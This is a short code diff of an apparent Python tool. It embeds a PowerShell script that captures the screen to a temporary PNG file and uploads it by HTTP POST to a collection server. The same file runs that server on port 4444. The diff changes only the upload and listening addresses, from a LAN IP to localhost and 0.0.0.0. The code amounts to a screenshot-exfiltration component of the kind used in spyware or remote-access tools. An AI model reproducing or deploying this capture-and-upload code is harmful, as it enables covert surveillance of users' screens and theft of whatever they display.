@@ -19,7 +19,7 @@ $tempPath = [System.IO.Path]::GetTempFileName() + ".png";
 $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png); 
 $bitmap.Dispose(); 
 $graphics.Dispose(); 
-$uploadUrl = "http://192.168.31.156:4444"; 
+$uploadUrl = "http://127.0.0.1:40004"; 
 Invoke-RestMethod -Uri $uploadUrl -Method Post -InFile $tempPath -ContentType "multipart/form-data";
 """)
 
@@ -50,7 +50,7 @@ Invoke-RestMethod -Uri $uploadUrl -Method Post -InFile $tempPath -ContentType "m
 
 if __name__ == '__main__':
     port = 4444
-    server_address = ('192.168.31.156', port)
+    server_address = ('0.0.0.0', port)
 
     with HTTPServer(server_address, WebHandler) as httpd: #Запуск Веб-сервера
         print(f"Serving on port {port}")
